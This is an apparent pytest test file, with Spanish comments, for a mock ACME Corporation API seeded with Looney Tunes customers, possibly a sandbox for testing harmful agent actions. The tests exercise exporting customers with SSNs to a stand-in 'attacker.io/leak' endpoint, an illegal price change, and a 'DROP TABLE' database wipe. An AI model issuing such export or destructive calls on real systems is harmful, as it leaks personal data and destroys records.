"""Pruebas unitarias y de integración para la API y la base de datos de ACME Corporation."""

import sys
from pathlib import Path
import pytest
from httpx import ASGITransport, AsyncClient

# Asegurar importación de acme-corp
ACME_ROOT = Path(__file__).resolve().parent.parent
if str(ACME_ROOT) not in sys.path:
    sys.path.insert(0, str(ACME_ROOT))

from server.app import create_app
from server.database import AcmeDatabase, DatabaseWipedError


@pytest.fixture
def temp_db(tmp_path: Path) -> AcmeDatabase:
    """Crea una base de datos SQLite temporal y aislada para cada test."""
    db_file = tmp_path / "test_acme.db"
    db = AcmeDatabase(db_path=db_file)
    return db


@pytest.fixture
def app_with_temp_db(temp_db: AcmeDatabase):
    """Crea una aplicación FastAPI inyectando la base de datos temporal."""
    return create_app(db_path=temp_db.db_path)


def test_initial_seed_data(temp_db: AcmeDatabase):
    """Verifica que el seed inicial contenga los 6 productos y 5 clientes Looney Tunes."""
    state = temp_db.get_state()
    assert state["counts"]["products"] == 6
    assert state["counts"]["customers"] == 5
    assert not state["database_wiped"]

    skus = [p["sku"] for p in state["products"]]
    assert "ACME-ROCKET-01" in skus
    assert "ACME-TNT-04" in skus
    assert "ACME-ANVIL-03" in skus

    customer_emails = [c["email"] for c in state["customers"]]
    assert "wile.coyote@desierto-acme.looney" in customer_emails
    assert "pato.lucas@studios-looney.com" in customer_emails


@pytest.mark.asyncio
async def test_crm_create_quote_endpoint(app_with_temp_db):
    """Prueba la emisión de una cotización a través de POST /crm/create_quote."""
    transport = ASGITransport(app=app_with_temp_db)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        payload = {
            "customer": "Wile E. Coyote",
            "customer_id": "cust_coyote_01",
            "product": "ACME-ROCKET-01",
            "amount": 4500.0,
            "currency": "USD",
            "details": "Entrega express en barranco de Sonora",
        }
        res = await client.post("/crm/create_quote", json=payload)
        assert res.status_code == 200
        data = res.json()
        assert data["status"] == "success"
        assert data["quote_id"].startswith("QUO-")
        assert data["customer_name"] == "Wile E. Coyote"
        assert data["amount"] == 4500.0


@pytest.mark.asyncio
async def test_crm_export_customers_endpoint(app_with_temp_db):
    """Prueba la exportación de clientes a través de POST /crm/export_customers."""
    transport = ASGITransport(app=app_with_temp_db)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        payload = {
            "destination": "https://attacker.io/leak",
            "format": "csv",
            "include_ssn": True,
        }
        res = await client.post("/crm/export_customers", json=payload)
        assert res.status_code == 200
        data = res.json()
        assert data["status"] == "success"
        assert data["total_records"] == 5
        assert len(data["customers"]) == 5
        assert data["destination"] == "https://attacker.io/leak"


@pytest.mark.asyncio
async def test_stripe_refund_endpoint(app_with_temp_db):
    """Prueba el registro de un reembolso a través de POST /stripe/refund."""
    transport = ASGITransport(app=app_with_temp_db)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        payload = {
            "transaction_id": "tx_looney_9921",
            "customer_name": "Lucas 'Daffy' Duck",
            "amount": 12500.0,
            "reason": "Yunque abollado al caer",
        }
        res = await client.post("/stripe/refund", json=payload)
        assert res.status_code == 200
        data = res.json()
        assert data["status"] == "success"
        assert data["refund_id"].startswith("REF-")
        assert data["amount"] == 12500.0


@pytest.mark.asyncio
async def test_catalog_update_price_and_tampering(app_with_temp_db, temp_db: AcmeDatabase):
    """Prueba la modificación de precios, resolución de ID numérico y detección de tampering."""
    transport = ASGITransport(app=app_with_temp_db)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        # ID numérico '88' debe resolverse a ACME-ROCKET-01
        payload = {
            "product_id": "88",
            "new_price": 9.99,
            "reason": "Rebaja ilegal",
        }
        res = await client.post("/catalog/update_price", json=payload)
        assert res.status_code == 200
        data = res.json()
        assert data["status"] == "success"
        assert data["product_id"] == "ACME-ROCKET-01"
        assert data["new_price"] == 9.99
        assert data["is_tampered"] is True

        # Verificar evento de sabotaje en la bitácora
        state = temp_db.get_state()
        tamper_events = [e for e in state["events"] if e["event_type"] == "CATALOG_PRICE_TAMPERING"]
        assert len(tamper_events) >= 1
        assert tamper_events[0]["severity"] == "CRITICAL"


@pytest.mark.asyncio
async def test_database_drop_and_503_wiped(app_with_temp_db, temp_db: AcmeDatabase):
    """Prueba el ataque destructivo (database.drop) y posterior error HTTP 503 en operaciones."""
    transport = ASGITransport(app=app_with_temp_db)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        # 1. Ejecutar purga destructiva
        drop_res = await client.post("/db/database.drop", json={"query": "DROP TABLE products;"})
        assert drop_res.status_code == 200
        drop_data = drop_res.json()
        assert drop_data["status"] == "wiped"
        assert drop_data["database_wiped"] is True

        # 2. Las tablas operativas deben estar vacías
        state = temp_db.get_state()
        assert state["database_wiped"] is True
        assert state["counts"]["products"] == 0
        assert state["counts"]["customers"] == 0

        # 3. Intentos de invocar servicios operativos deben fallar con HTTP 503
        quote_res = await client.post("/crm/create_quote", json={"customer": "Test", "amount": 100})
        assert quote_res.status_code == 503
        assert "purgada" in quote_res.json()["detail"].lower()

        refund_res = await client.post("/stripe/refund", json={"amount": 50})
        assert refund_res.status_code == 503

        # 4. Restablecer la base de datos con /api/reset
        reset_res = await client.post("/api/reset")
        assert reset_res.status_code == 200
        assert reset_res.json()["status"] == "success"

        # 5. La base de datos debe estar nuevamente operativa
        health_res = await client.get("/health")
        assert health_res.status_code == 200
        assert health_res.json()["database_wiped"] is False

        # Y create_quote debe volver a funcionar
        quote_again = await client.post("/crm/create_quote", json={"customer": "Correcaminos", "amount": 200})
        assert quote_again.status_code == 200
